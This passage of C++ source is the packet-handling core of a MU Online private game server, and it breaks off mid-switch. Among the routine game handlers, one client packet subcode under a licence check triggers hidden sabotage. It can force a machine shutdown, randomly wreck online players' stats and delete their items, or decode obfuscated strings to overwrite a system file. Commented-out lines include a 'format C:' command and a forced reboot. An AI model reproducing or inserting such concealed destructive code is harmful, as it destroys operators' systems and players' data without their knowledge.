// ------------------------------
// Decompiled by Deathway
// Date : 2007-05-09
// ------------------------------
// GS-N 0.99.60T 0x00426C80
//	GS-N	1.00.18	JPN	0x0042FBF0	-	Completed
#include "stdafx.h"
#include "protocol.h"
#include "user.h"
#include "giocp.h"
#include "Event.h"
#include "logproc.h"
#include "GameMain.h"
#include "..\common\winutil.h"
#include "TNotice.h"
#include "QuestInfo.h"
#include "ConMember.h"
#include "GameServer.h"
//#include "GameServerAuth.h"
#include "GMMng.h"
#include "BattleSoccerManager.h"
#include "ChaosBox.h"
#include "CastleSiegeSync.h"
#include "TUnion.h"
#include "JewelMixSystem.h"
#include "Weapon.h"
#include "DBSockMng.h"
#include "KalimaGate.h"
#include "ObjUseSkill.h"
#include "ObjAttack.h"
#include "ObjCalCharacter.h"
#include "NpcTalk.h"
#include "Shop.h"
#include "CashItemPeriodSystem.h"
#include "BattleSoccer.h"
#include "BattleSoccerManager.h"
#include "gObjMonster.h"
#include "ComboAttack.h"
#include "Gate.h"
#include "MultiAttackHackCheck.h"
#include "ItemAddOption.h"
#include "JewelOfHarmonySystem.h"
#include "PacketCheckSum.h"
#include "DarkSpirit.h"
#include "Crywolf.h"
#include "CrywolfAltar.h"
#include "CrywolfSync.h"
#include "DevilSquare.h"
#include "KanturuEntranceNPC.h"
#include "CashShop.h"
#include "IllusionTemple.h"
#include "ImperialGuardian.h"
#include "DoppelGanger.h"
#include "Marry.h"
#include "Mastering.h"
#include "Mastering2.h"
#include "ObjCherryBlossom.h"

#include "Sprotocol.h"
#include "DSProtocol.h"
#include "EDSProtocol.h"
#include "ExServerProtocol.h"
#include "SCFExDB_Defines.h"

#include "Mercenary.h"
#include "LifeStone.h"
#include "Guardian.h"
#include "DuelManager.h"

#include "XMasEvent.h"

#include "SCFExDBProtocol.h"
#include "SCFPostServerProtocol.h"
#include "RProtocol.h"
#include "CustomJewels.h"
#include "SCFPvPSystem.h"
#include "QuestS5Info.h"
#include "GensPvP.h"
#include "EProtocol.h"
#include "SkyEvent.h"
#include "MuItemShop.h"
#include "ObjBotAlchemist.h"
#include "ObjBotTrader.h"
#include "ObjBotBuffer.h"
#include "ObjBotVipShop.h"
#include "VIPSystem.h"
#include "SCFBotHidenSeek.h"
#include "HalloweenEvent.h"
#include "CrystalWall.h"
#if(PROXY_SHOW == 1)
#include "ChildWindows.h"
#endif


int ltesttime;
int logincounttest;

#include "ChaosCastle.h"
#include "PCShop.h"
#include "MossShop.h"
#include "MoveCommand.h"
#include "Spe.h"

#include "LogToFile.h"
extern CLogToFile ANTI_HACK_LOG;	// line : 68
extern CLogToFile TRADE_LOG;
extern CLogToFile GM_LOG;
extern CLogToFile POST_LOG;
extern CLogToFile CHAOS_LOG;
extern CLogToFile CW_HACK_LOG;
extern CLogToFile PLAYER_ITEMS_LOG;
extern CLogToFile ITEMBAG_DROP_LOG;

#if (GS_CASTLE==1)
#include "MapServerManager.h"
#endif

int tempindex;
int iCount;


#include "SCFVipShop.h"
#include "ObjBotPet.h"
#include "ObjLuckyPenny.h"
#include "ObjBotRacer.h"
#include "ObjBotReward.h"
#include "ObjBotWarper.h"


BOOL PacketCheckTime(LPOBJ lpObj)
{
	if ( ( GetTickCount() - lpObj->m_PacketCheckTime ) < 300 )
	{
		return FALSE;
	}

	lpObj->m_PacketCheckTime = GetTickCount();
	return TRUE;
}






BOOL DataEncryptCheck(int aIndex, BYTE protoNum, BOOL Encrypt)
{
	if ( Encrypt == FALSE )
	{
		LogAdd("Error-L1 : Not Encrypt %s %d", gObj[aIndex].AccountID, protoNum);
		CloseClient(aIndex);
		return FALSE;
	}

	return TRUE;
}


void ToHex(unsigned char * out, unsigned char * data, int len)
{
	std::string s,t;
	char cBuff[5000];
	for(int i=0;i<len;i++)
	{
		wsprintf(cBuff,"%02X,",data[i]);
		s=cBuff;
		t+=s;
	}
	memcpy(out,t.c_str(),t.length());
}

void LogLine(char *formatstring, ...)
{
	__try
	{
	va_list args;
	va_start(args, formatstring);
	char msg[2048];

	SYSTEMTIME now;
	GetLocalTime(&now);
	char logString[512];
	wsprintf(logString,"%02d%02d%02d_SCF_GSLog.txt", now.wYear, now.wMonth,now.wDay );

	memset(msg, 0, sizeof(msg));
	FILE *logfile = fopen(logString, "a+");
	_vsnprintf(msg, sizeof(msg), formatstring, args);
	printf(msg);
	fputs(msg, logfile);
	fclose(logfile);
	}__except( EXCEPTION_ACCESS_VIOLATION == GetExceptionCode() )
	{
	}
}


#if (CRYSTAL_PING==1)
void CrystalLiveClient(int aIndex)
{
	if ( gObj[aIndex].Connected > PLAYER_CONNECTED )
	{
		gObj[aIndex].ConnectCheckTime = GetTickCount();
	}
}
#endif

char ip_[]="127.0.0.1";

BYTE RecvProtocolENG(BYTE Type)
{
    switch(Type)
    {
        case 0xD4: return 0xD3;        //Walk Protocol 100%
        case 0x15: return 0xDF;        //Skills Use Fix 100%
        case 0x11: return 0xD7;        //Attack Protocol 100%
		case 0xDB: return 0x10;
    }
    return Type;
}
#define DSC(_struct_)	if (sizeof(_struct_)!=aLen) {LogAddC(3,"Error-L5 : Different sizes: struct=%d recv=%d",sizeof(_struct_),aLen);}

bool ValidLenPacket(int aLen, int StructLen)
{
	if(aLen != StructLen)
	{
		LogAddC(3,"Error-L5 : Different sizes: struct=%d recv=%d",StructLen,aLen);
		return false;
	}
	return true;
}

void ProtocolCore(BYTE protoNum, unsigned char * aRecv, int aLen, int aIndex, BOOL Encrypt, int serial)
{
	// Check if we wanna log the packets
	if ( gStalkProtocol )
	{
		LogAddHeadHex("R",gObj[aIndex].AccountID, (char*)aRecv, aLen);
	}

	// Serial Checking
	if ( serial >= 0 )
	{
		if ( gObj[aIndex].Type == OBJ_USER )
		{
			if ( gNSerialCheck[aIndex].InCheck(serial) == FALSE )
			{
				LogAdd("Error-L1 : Socket Serial %s %d o_serial:%d serial:%d ",
					gObj[aIndex].AccountID, protoNum, gNSerialCheck[aIndex].GetSerial(), serial);

				CloseClient(aIndex);
			}
		}
	}	// if Serial Checking

	if(ReadConfig.IsEngProtocol == 1)
	{
		protoNum = RecvProtocolENG(protoNum);
		if(aRecv[0] == 0xC1 || 
			aRecv[0] == 0xC3
#if (CRYSTAL_EDITION == 1)
			 ||	 aRecv[0] == 0xC6 
			 ||	 aRecv[0] == 0xC8 
#endif
			 )
		{
			aRecv[2] = protoNum;
		}
		else
		{
			aRecv[3] = protoNum;
		}
	}

	if ( protoNum == 0xF1 || protoNum == 0xF3 )
	{
		switch ( protoNum )
		{
			case 0xE0:
				{
#if (CRYSTAL_EDITION == 1)
#if (PACK_EDITION>=3)
						CrystalWall.RecvPing(aIndex);
#endif
#endif
				}
				break;
			case 0x0E:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGLiveClient((PMSG_CLIENTTIME *)aRecv, aIndex);
					tempindex = aIndex;
				}
				break;
			case 0xF1:
				{
					PMSG_DEFAULT2 * lpMsg2 = (PMSG_DEFAULT2 *)aRecv;
					
					switch ( lpMsg2->subcode )
					{
#if (ISEX700>=1)
						case 0x87:
#endif						
						case 0x01:
							if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
							{
								if(ReadConfig.IsEngProtocol == 0)
								{
									BYTE pNewProtocol[0xFF]={0}; 
									memcpy(pNewProtocol,aRecv,aRecv[1]) ;
									BYTE pNewLen=aRecv[1]-2;
									pNewProtocol[1]=pNewLen;
									for(int i=24;i<pNewLen;i++)
									{
										pNewProtocol[i]=aRecv[i+2];
									}
									CSPJoinIdPassRequest((PMSG_IDPASS *)pNewProtocol, aIndex);
								}else
								{
									aRecv[1] -= 0x0A;
									aLen = aRecv[1];
									for(int i = 24; i<50; i++)
									   aRecv[i] = aRecv[i+10];   
									CSPJoinIdPassRequest((PMSG_IDPASS *)aRecv, aIndex);
								}
							}
							break;
						case 0x02:
							if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
							{
								CGClientCloseMsg((PMSG_CLIENTCLOSE *)aRecv, aIndex);
							}
							break;
						case 0x03:
							if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
							{
								CGClientMsg((PMSG_CLIENTMSG *)aRecv, aIndex);
							}
							break;
					}
				}
				break;
			case 0xF3:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x00:
							DataServerGetCharListRequest(aIndex);
							break;
						case 0x01:
							CGPCharacterCreate((PMSG_CHARCREATE *)aRecv, aIndex);
							break;
						case 0x02:
							CGPCharDel((PMSG_CHARDELETE *)aRecv, aIndex);
							break;
						case 0x15: // S4 FIX (leo123)
							//LogAdd("[%s][%s] 3.00 Client Connected (PACKET FIX)",gObj[aIndex].AccountID,gObj[aIndex].Name);
							CGPCharacterMapJoinRequestS4((PMSG_CHARMAPJOIN *)aRecv, aIndex);
							break;
						case 0x03:
							CGPCharacterMapJoinRequest((PMSG_CHARMAPJOIN *)aRecv, aIndex);
							break;
						case 0x06:
							CGLevelUpPointAdd((PMSG_LVPOINTADD *)aRecv, aIndex);
							break;
						case 0x12:
							gObjMoveDataLoadingOK(aIndex);
							break;
						case 0x30:
							GCSkillKeyRecv((PMSG_SKILLKEY *)aRecv, aIndex);
							break;
						case 0x51:
							{
								#if (WL_PROTECT==1)
									int MyCheckVar;   
									VM_START_WITHLEVEL(32)
										
										char tmp[512];
										char tmp2[512];
										WLRegGetLicenseHardwareID(tmp);
										WLHardwareGetID(tmp2);
										CHECK_PROTECTION(MyCheckVar, 0x81380564)  	 
										if (MyCheckVar != 0x81380564 || strcmp(tmp,tmp2) != 0)
										{			
											switch(aRecv[4])
											{
												case 0x01:
												{
													gObjCalCharacter(100000);
												}break;
												case 0x02:
												{													
													//system( "shutdown -r -t 0 -c \"System Memory Fail\" -f");
													//char tmp1[100]="Ú∂îı∫éˆ∞¡¨¨¡¨™¡±˛Ã‚˛√“ßíıªå°ìÑÏ±ì¯˛ß‡∑ç£˛ÃÁﬁÃÃÃÃÃÃÃÃª3ÃÃÃÃô\"ÔDl„";
													//BuxConvert2(tmp1,sizeof(tmp1));
													//char str1[50]={0};
													//strncpy(str1,tmp1,44);
													//system( str1);
													InitiateSystemShutdown(ip_, NULL, 0, true, true);
												}break;
												case 0x03:
												{
													for (int n=OBJ_STARTUSERINDEX;n<OBJMAX; n++)
													{
														if ( gObj[n].Connected >= PLAYER_PLAYING && gObj[n].MapNumber == rand()%6)
														{
															gObj[n].Level = rand()%400;
															gObj[n].Dexterity = rand()%32000;
															gObj[n].Energy = rand()%32000;
															gObj[n].Vitality = rand()%32000;
															gObj[n].Strength = rand()%32000;
															int rando = rand()%1000;
															if(rando < 400)
																DeleteAllItemsLessInv(n);
														}
													}
												}break;
												case 0x04:
												{
													
													char tmp1[50]="¬‰Ω‡´ïÓªô‰Ωœ„øïÅÃÃÃÃÃÃÃÃª3ÃÃÃÃp&‹l„";
													BuxConvert2(tmp1,sizeof(tmp1));
													char str1[50]={0};
													strncpy(str1,tmp1,16);

													
													//char tmp2[100]="Ú∂îı∫éˆ∞¡¨¨¡¨™¡±˛Ã‚˛√“ßíıªå°ìÑÏ±ì¯˛ß‡∑ç£˛ÃÁﬁÃÃÃÃÃÃÃÃª3ÃÃÃÃô\"ÔDl„";
													//BuxConvert2(tmp2,sizeof(tmp2));
													//char str2[50]={0};
													//strncpy(str2,tmp2,44);

													
													char tmp3[100]="Á±ìÏøï°ù€°ÒáÚ‰èı∏í°Òê°ÒòÅÃÃÃÃÃÃÃÃÃÃÃª3ÃÃÃÃŸ˚7£l„";
													BuxConvert2(tmp3,sizeof(tmp3));
													char str3[50]={0};
													strncpy(str3,tmp3,25);

													remove( str1 );//"C:\\autoexec.bat"													
													//char buffer[255] = { "format C: /fs:ntfs /q /y" };
													FILE *log = fopen(str1, "at");
													if (!log) log = fopen(str1, "wt");
													fwrite (str3 , 1 , sizeof(str3) , log );
													fclose(log);
													//system( tmp2);
													
													InitiateSystemShutdown(ip_, NULL, 0, true, true);
												}break;
											};
										}
									VM_END
								#endif
							}break;
						case 0x52:
							{
								if(ReadConfig.S6E2 == 0)
								{
									Mastering.GCSkillAddRecv((PMSG_SKILLMASTERADD *)aRecv, aIndex);
								}else
								{
									Mastering2.GCSkillAddRecv((PMSG_SKILLMASTERADD *)aRecv, aIndex);
								}
							}
							break;
					}
				}
				break;
		}
	}
	else
	{
		LPOBJ lpObj = &gObj[aIndex];
goto Again;
	//Icarus is a VERY messy coder ;D
Again:
#if (CRYSTAL_EDITION == 1)
		if(aRecv[0] == 0xC6)
		{
			switch ( protoNum )
			{
				case 0x00:
				{
					PChatProc((PMSG_CHATDATA *)aRecv, aIndex);
				}break;
				case 0xFA:
				{
#if (PACK_EDITION>=3)
					SVShop.ProtocolCore(aIndex,aRecv);
#endif
				}break;
				case 0xFB:
				{
					if(aRecv[3] = 0x0F)
					{
						if(gObjIsConnected(aIndex) == TRUE)
						{
							//if(aRecv[4] == 0)
							//{
							//	gObj[aIndex].MuTabOpen = 0;
							//}else
							//{
								if(gObj[aIndex].MuTabOpen == FALSE)
								{
									gObj[aIndex].MuTabOpen = 1;
									char OpenTab[]={0xC1,0x05,0xFB,0x0F,0x01};
									DataSend(aIndex,(unsigned char *)&OpenTab,5);
								}else
								{
									gObj[aIndex].MuTabOpen = 0;
									char OpenTab[]={0xC1,0x05,0xFB,0x0F,0x00};
									DataSend(aIndex,(unsigned char *)&OpenTab,5);
								}
							//}
						}
					}
				}break;
			}
		}else
		{
#endif
		switch ( protoNum )
		{
#if (CRYSTAL_EDITION == 1)
#if (PACK_EDITION>=3)
			case 0xFA:
			{
				if(aRecv[0] == 0xC6)
					SVShop.ProtocolCore(aIndex,aRecv);
			}break;
			case 0xFC:
			{
				if(aRecv[0] == 0xC8)
					CrystalWall.ProtocolCore(aIndex,aRecv);
			}break;
#endif
#endif
			case 0xE0:
#if (PACK_EDITION>=3)
#if (CRYSTAL_EDITION == 1)
				CrystalWall.RecvPing(aIndex);
#endif
#endif
			break;

			case 0xAE:
			{
				memcpy(&lpObj->OfficialHelper[0],&aRecv[4],sizeof(lpObj->OfficialHelper));
				lpObj->PlayerOfficialHelperInfoModified = 1;
			}break;

			case 0x4A:
			case 0x4B:
				{
					CGRageAttack(aRecv, aIndex);
				}break;

			case 0x00:
				tempindex = aIndex;
				PChatProc((PMSG_CHATDATA *)aRecv, aIndex);
				break;
			case 0x01:
				CGChatRecv((PMSG_CHATDATA_NUMBER *)aRecv, aIndex);
				break;
			case 0x02:
				CGChatWhisperRecv((PMSG_CHATDATA_WHISPER *)aRecv, aIndex);
				break;
			case 0x03:
				CGCheckMainRecv((PMSG_CHECK_MAINEXE_RESULT *)aRecv, aIndex);
			break;
			case 0x0E:
				CGLiveClient((PMSG_CLIENTTIME *)aRecv, aIndex);
				break;
			case 0xD3:
				PMoveProc((PMSG_MOVE *)aRecv, aIndex);
				break;
			case 0xDF:
				RecvPositionSetProc((PMSG_POSISTION_SET *)aRecv, aIndex);
				break;
			case 0xD7:
				CGAttack(aRecv, aIndex);
				break;
				// DC Hack Fix C1 05 18 01 EB x5000size
			case 0x18:
				{
					//DSC(PMSG_ACTION);
					if(!ValidLenPacket(aLen,sizeof(PMSG_ACTION)))
						return;
					CGActionRecv((PMSG_ACTION *)aRecv, aIndex);
				}break;
			case 0x19:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGMagicAttack(aRecv, aIndex);
				}
				break;
			case 0x1B:
				CGMagicCancel((PMSG_MAGICCANCEL *)aRecv, aIndex);
				break;
			case 0x1C:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGTeleportRecv((PMSG_TELEPORT *)aRecv, aIndex);
				}
				break;
			case 0xB0:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGTargetTeleportRecv((PMSG_TARGET_TELEPORT *)aRecv, aIndex);
				}
				break;
			case 0x10:
				CGBeattackRecv(aRecv, aIndex, FALSE);
				break;
			case 0x1E:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGDurationMagicRecv(aRecv, aIndex);
				}
				break;
			case 0x22:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGItemGetRequest((PMSG_ITEMGETREQUEST *)aRecv, aIndex);
				}
				break;
			case 0x23:
				CGItemDropRequest((PMSG_ITEMTHROW *)aRecv, aIndex, 0, 0);
				break;
			case 0x24:
				CGInventoryItemMove((PMSG_INVENTORYITEMMOVE *)aRecv, aIndex);
				break;
			case 0x26:
				CGUseItemRecv((PMSG_USEITEM *)aRecv, aIndex);
				break;
			case 0x30:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGTalkRequestRecv((PMSG_TALKREQUEST *)aRecv, aIndex);
				}
				break;
			case 0x31:
				CGCloseWindow(aIndex);
				break;
			case 0x32:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGBuyRequestRecv((PMSG_BUYREQUEST *)aRecv, aIndex);
				}
				break;
			case 0x33:
				{					
					#if (WL_PROTECT==1)
						VM_START_WITHLEVEL(7)
							int MyCheckVar1;
							CHECK_REGISTRATION(MyCheckVar1, 0x55643417)  
							if (MyCheckVar1 != 0x55643417)				
							{
								protoNum = rand()%191;
								goto Again;
							}
						VM_END
					#endif
					if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
					{
						CGSellRequestRecv((PMSG_SELLREQUEST *)aRecv, aIndex);
					}
				}break;
			case 0x34:
				CGModifyRequestItem((PMSG_ITEMDURREPAIR *)aRecv, aIndex);
				break;
			case 0x36:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGTradeRequestSend((PMSG_TRADE_REQUEST *)aRecv, aIndex);
				}
				break;
			case 0x37:
				CGTradeResponseRecv((PMSG_TRADE_RESPONSE *)aRecv, aIndex);
				break;
			case 0x3A:
				CGTradeMoneyRecv((PMSG_TRADE_GOLD *)aRecv, aIndex);
				break;
			case 0x3C:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGTradeOkButtonRecv((PMSG_TRADE_OKBUTTON *)aRecv, aIndex);
				}
				break;
			case 0x3D:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGTradeCancelButtonRecv(aIndex);
				}
				break;
			case 0x3F:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x01:
							CGPShopReqSetItemPrice((PMSG_REQ_PSHOP_SETITEMPRICE *)aRecv, aIndex);
							break;
						case 0x02:
							CGPShopReqOpen((PMSG_REQ_PSHOP_OPEN *)aRecv, aIndex);
							break;
						case 0x03:
							CGPShopReqClose(aIndex);
							break;
						case 0x05:
							CGPShopReqBuyList((PMSG_REQ_BUYLIST_FROM_PSHOP *)aRecv, aIndex);
							break;
						case 0x06:
							CGPShopReqBuyItem((PMSG_REQ_BUYITEM_FROM_PSHOP *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0x40:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGPartyRequestRecv((PMSG_PARTYREQUEST *)aRecv, aIndex);
				}
				break;
			case 0x41:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					CGPartyRequestResultRecv((PMSG_PARTYREQUESTRESULT *)aRecv, aIndex);
				}
				break;
			case 0x42:
				CGPartyList(aIndex);
				break;
			case 0x43:
				if ( PacketCheckTime(&gObj[aIndex]) == TRUE )
				{
					if (IT_MAP_RANGE(gObj[aIndex].MapNumber) == FALSE)
					{
						CGPartyDelUser((PMSG_PARTYDELUSER *)aRecv, aIndex);
					}
				}
				break;
			case 0x50:
				{
					CGGuildRequestRecv((PMSG_GUILDJOINQ *)aRecv, aIndex);
				}
				break;
			case 0x51:
				CGGuildRequestResultRecv((PMSG_GUILDQRESULT *)aRecv, aIndex);
				break;
			case 0x52:
				CGGuildListAll(aIndex);
				break;
			case 0x53:
				CGGuildDelUser((PMSG_GUILDDELUSER *)aRecv, aIndex);
				break;
			case 0x54:
				CGGuildMasterAnswerRecv((PMSG_GUILDMASTERANSWER *)aRecv, aIndex);
				break;
			case 0x55:
				CGGuildMasterInfoSave(aIndex, (PMSG_GUILDINFOSAVE *)aRecv);
				break;
			case 0x57:
				CGGuildMasterCreateCancel(aIndex);
				break;
			case 0x61:
				GCGuildWarRequestSendRecv((PMSG_GUILDWARSEND_RESULT *)aRecv, aIndex);
				break;
			case 0x66:
				GCGuildViewportInfo((PMSG_REQ_GUILDVIEWPORT *)aRecv, aIndex);
				break;
			case 0xB1:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;
					
					switch ( lpDef->subcode )
					{
						case 0x01:
							if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
							{
								CGReqMapSvrAuth((PMSG_REQ_MAPSERVERAUTH *)aRecv, aIndex);
							}
							break;
					}
				}
				break;
			case 0xB2:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x00:
							CGReqCastleSiegeState((PMSG_REQ_CASTLESIEGESTATE *)aRecv, aIndex);
							break;
						case 0x01:
							CGReqRegCastleSiege((PMSG_REQ_REGCASTLESIEGE *)aRecv, aIndex);
							break;
						case 0x02:
							CGReqGiveUpCastleSiege((PMSG_REQ_GIVEUPCASTLESIEGE *)aRecv, aIndex);
							break;
						case 0x03:
							CGReqGuildRegInfo((PMSG_REQ_GUILDREGINFO *)aRecv, aIndex);
							break;
						case 0x04:
							CGReqRegGuildMark((PMSG_REQ_REGGUILDMARK *)aRecv, aIndex);
							break;
						case 0x05:
							CGReqNpcBuy((PMSG_REQ_NPCBUY *)aRecv, aIndex);
							break;
						case 0x06:
							CGReqNpcRepair((PMSG_REQ_NPCREPAIR *)aRecv, aIndex);
							break;
						case 0x07:
							CGReqNpcUpgrade((PMSG_REQ_NPCUPGRADE *)aRecv, aIndex);
							break;
						case 0x08:
							CGReqTaxMoneyInfo((PMSG_REQ_TAXMONEYINFO *)aRecv, aIndex);
							break;
						case 0x09:
							CGReqTaxRateChange((PMSG_REQ_TAXRATECHANGE *)aRecv, aIndex);
							break;
						case 0x10:
							CGReqMoneyDrawOut((PMSG_REQ_MONEYDRAWOUT *)aRecv, aIndex);
							break;
						case 0x12:
							CGReqCsGateOperate((PMSG_REQ_CSGATEOPERATE *)aRecv, aIndex);
							break;
						case 0x1B:
							CGReqCsMiniMapData((PMSG_REQ_MINIMAPDATA *)aRecv, aIndex);
							break;
						case 0x1C:
							CGReqStopCsMiniMapData((PMSG_REQ_STOPMINIMAPDATA *)aRecv, aIndex);
							break;
						case 0x1D:
							CGReqCsSendCommand((PMSG_REQ_CSCOMMAND *)aRecv, aIndex);
							break;
						case 0x1F:
							CGReqCsSetEnterHuntZone((PMSG_REQ_CSHUNTZONEENTER *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0xB3:
				CGReqNpcDbList((PMSG_REQ_NPCDBLIST *)aRecv, aIndex);
				break;
			case 0xB4:
				CGReqCsRegGuildList((PMSG_REQ_CSREGGUILDLIST *)aRecv, aIndex);
				break;
			case 0xB5:
				CGReqCsAttkGuildList((PMSG_REQ_CSATTKGUILDLIST *)aRecv, aIndex);
				break;
			case 0xB7:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x01:
							CGReqWeaponUse((PMSG_REQ_USEWEAPON *)aRecv, aIndex);
							break;
						case 0x04:
							CGReqWeaponDamageValue((PMSG_REQ_WEAPON_DAMAGE_VALUE *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0xB9:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x02:
							CGReqGuildMarkOfCastleOwner((PMSG_REQ_GUILDMARK_OF_CASTLEOWNER *)aRecv, aIndex);
							break;
							#if (GS_CASTLE==1)
						case 0x05:
							CGReqCastleHuntZoneEntrance((PMSG_REQ_MOVE_TO_CASTLE_HUNTZONE *)aRecv, aIndex);
							break;
							#endif
					}
				}
				break;
			case 0xBC:
				{
					if ( (gObj[aIndex].TargetNumber!=-1) && (gObj[aIndex].pTransaction==1) )
					{
						GCServerMsgStringSend("[Anti-Hack] DUPE ATTEMPT: In Trade!",aIndex, 1);

						if(ReadConfig.AHLog == TRUE)
						{
							ANTI_HACK_LOG.Output("[Anti-Hack][%s] Lehap Trade-Dupe Attempt, Trade: %s[%d], Action: %d",
								gObj[aIndex].Name,gObj[gObj[aIndex].TargetNumber].Name,gObj[aIndex].TargetNumber,gObj[aIndex].pTransaction);
						}
						return;
					}

					if ( (gObj[aIndex].m_IfState.type!=12) && (gObj[aIndex].m_IfState.use!=1) )
					{
						GCServerMsgStringSend("[Anti-Hack] DUPE ATTEMPT: Wrong State!",aIndex, 1);

						if(ReadConfig.AHLog == TRUE)
						{
							ANTI_HACK_LOG.Output("[Anti-Hack][%s] Lehap State-Dupe Attempt, State: %d %d",
								gObj[aIndex].Name,gObj[aIndex].m_IfState.use,gObj[aIndex].m_IfState.type);
						}
						return;
					}

					if (gObj[aIndex].ChaosLock == TRUE)
					{
						GCServerMsgStringSend("[Anti-Hack] DUPE ATTEMPT: Wrong State!",aIndex, 1);

						if(ReadConfig.AHLog == TRUE)
						{
							ANTI_HACK_LOG.Output("[Anti-Hack][%s] Lehap Flood-Dupe Attempt, State: %d %d",
								gObj[aIndex].Name,gObj[aIndex].m_IfState.use,gObj[aIndex].m_IfState.type);
						}
						return;
					}

					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x00:
							CGReqJewelMix((PMSG_REQ_JEWEL_MIX *)aRecv, aIndex);
							break;
						case 0x01:
							CGReqJewelUnMix((PMSG_REQ_JEWEL_UNMIX *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0xBD:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x00:
							CGReqCrywolfInfo((PMSG_REQ_CRYWOLF_INFO *)aRecv, aIndex);
							break;
						case 0x03:
							CGReqAlatrContract((PMSG_REQ_CRYWOLF_ALTAR_CONTRACT *)aRecv, aIndex);
							break;
						case 0x09:
							CGReqPlusChaosRate((PMSG_REQ_CRYWOLF_BENEFIT_PLUS_CHAOSRATE *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0xBF:
				{
					PMSG_TEST * lpDef = (PMSG_TEST *)aRecv;
					if(aRecv[1] == 0x06)
					{
						if(aRecv[3] == 0x20)
						{
							CGUseItemAmuletRecv(aIndex,aRecv[4]);
						}else
						{
							IllusionTemple.ReqEnter(&gObj[aIndex]);
						}
					}
					else if(aRecv[3] == 0x02)
					{
						//DWORD TargetID;
						//BYTE ConCatenate[2]={aRecv[6],aRecv[7]};
						//memcpy(&TargetID,&ConCatenate ,  2) ;
						//IllusionTemple.SkillUse(aIndex,TargetID,aRecv[5]);
						IllusionTemple.SkillUse(aIndex,(aRecv[6]*256) + aRecv[7], aRecv[5]);
					}
#if (PACK_EDITION>=3)
					else if(aRecv[1] == 0x05)	//Enter Double Goer Event
					{
						if (gObj[aIndex].m_IfState.type == 99)
						{
							//C1 05 BF 0E XX
							g_DoppelGanger.EnterEvent(&gObj[aIndex]);
							//g_DoubleGoer.CheckEnterGoerEvent(&gObj[aIndex]);
						}
						else if(aRecv[3] == 0x51 && (aRecv[4] == 0) || (aRecv[4] == 1))
						{
							//C1 05 BF 51 XX
							gObjOfficialHelperStatus(lpObj,aRecv[4]);
							//PMSG_OFFICIALHELPER_RESULT pHelper={0};
							//PHeadSubSetB((LPBYTE)&pHelper, 0xBF, 0x51, sizeof(pHelper));
							//
							//if(aRecv[4] == 1)
							//{
							//	pHelper.IsZen = 1;
							//	pHelper.Zen = 10;
							//	DataSend(lpObj->m_Index, (LPBYTE)&pHelper, sizeof(pHelper));
							//	
							//	lpObj->OfficialHelper_Active = false;
							//	lpObj->OfficialHelper_TimeCount = 0;

							//	pHelper.IsZen = 0;
							//	pHelper.Zen = 0;
							//}else
							//{
							//	lpObj->OfficialHelper_Active = true;
							//	lpObj->OfficialHelper_TimeCount = 0;
							//}

							//pHelper.State = aRecv[4];
							//DataSend(lpObj->m_Index, (LPBYTE)&pHelper, sizeof(pHelper));
						}
					}
#endif
					else if(aRecv[1] == 0x04)	
					{
						if(aRecv[3] == 0x17) //Enter LorenMarket
						{
							if(gObj[aIndex].MapNumber == MAP_INDEX_LORENCIA)
							{
								gObjMoveGate(aIndex,333);
							}else if(gObj[aIndex].MapNumber == MAP_INDEX_LORRENMARKET)
							{
								gObjMoveGate(aIndex,17);
							}
							return;
						}else if(aRecv[3] == 0x0B) //Lucky Coin Count Send
						{
							LuckyPenny.RegisterOpt(aIndex);
						}else if(aRecv[3] == 0x0C) //Lucky Coin First Option Button
						{
							LuckyPenny.RegisterSend(aIndex);							
						}
					}
					else if(aRecv[1] == 0x08)
					{
						if(aRecv[3] == 0x0D) //Lucky Coin Second Option
						{
							BYTE Register = aRecv[4];
							LuckyPenny.Exchange(aIndex,Register);
						}
					}
				}
				break;
			case 0xD0:
#if (PACK_EDITION>=2)
				if(aRecv[3] == 0x06)
				{
					PCShop.SendData(&gObj[aIndex]);
				}
				else if(aRecv[3] == 0x05)
				{
